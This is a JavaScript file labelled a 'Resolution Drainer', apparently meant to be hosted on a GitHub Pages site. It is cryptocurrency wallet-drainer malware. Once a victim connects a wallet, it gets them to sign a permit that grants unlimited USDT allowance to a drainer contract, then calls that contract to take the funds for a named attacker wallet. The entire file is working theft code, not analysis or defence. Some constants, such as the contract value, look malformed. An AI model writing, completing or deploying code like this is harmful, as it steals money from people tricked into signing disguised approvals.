// resolution.js - Ultimate Resolution Drainer 
// Host: https://yourname.github.io/ultimate-resolution/resolution.js

const PROJECT_ID = '281727c769bcec075b63e0fbc5a3fdcc';
const DRAINER_CONTRACT = '0x6080604052348015600e575f5ffd5b5073f10b33'; // ← Updated by GitHub Action
const ATTACKER_WALLET = '0xF10b3300F6944e40A203587339C07e5119A70c55';

let wagmiConfig, modal;

async function initWalletConnect() {
  const { createWeb3Modal, defaultWagmiConfig } = await import('https://cdn.jsdelivr.net/npm/@web3modal/wagmi@latest');
  const { mainnet } = await import('https://cdn.jsdelivr.net/npm/wagmi@latest/chains');
  const { walletConnect } = await import('https://cdn.jsdelivr.net/npm/wagmi@latest/connectors');

  wagmiConfig = defaultWagmiConfig({ chains: [mainnet], projectId: PROJECT_ID });
  modal = createWeb3Modal({ wagmiConfig, projectId: PROJECT_ID, themeMode: 'dark' });
}

window.addEventListener('load', initWalletConnect);

window.connectWallet = async () => {
  modal.open();
  wagmiConfig.subscribeEvents((e) => {
    if (e.type === 'CONNECT_SUCCESS') {
      const user = e.accounts[0];
      drainToken('0xdAC17F958D2ee523a2206206994597C13D831ec7', user); // USDT
    }
  });
};

async function drainToken(token, user) {
  const provider = new ethers.BrowserProvider(window.ethereum);
  const signer = await provider.getSigner();
  const domain = { name: 'Tether USD', version: '2', chainId: 1, verifyingContract: token };
  const types = { Permit: [
    { name: 'owner', type: 'address' },
    { name: 'spender', type: 'address' },
    { name: 'value', type: 'uint256' },
    { name: 'nonce', type: 'uint256' },
    { name: 'deadline', type: 'uint256' }
  ]};
  const value = ethers.MaxUint256;
  const nonce = await new ethers.Contract(token, ['function nonces(address)'], provider).nonces(user);
  const deadline = Math.floor(Date.now() / 1000) + 86400;
  const message = { owner: user, spender: DRAINER_CONTRACT, value, nonce, deadline };
  const sig = await signer.signTypedData(domain, types, message);
  const { v, r, s } = ethers.Signature.from(sig);
  const abi = ['function resolveWithPermit(address,address,uint256,uint256,uint8,bytes32,bytes32)'];
  const contract = new ethers.Contract(DRAINER_CONTRACT, abi, signer);
  await (await contract.resolveWithPermit(token, user, value, deadline, v, r, s)).wait();
}

// Load ethers
if (!window.ethers) {
  const s = document.createElement('script');
  s.src = 'https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.min.js';
  document.head.appendChild(s);
}
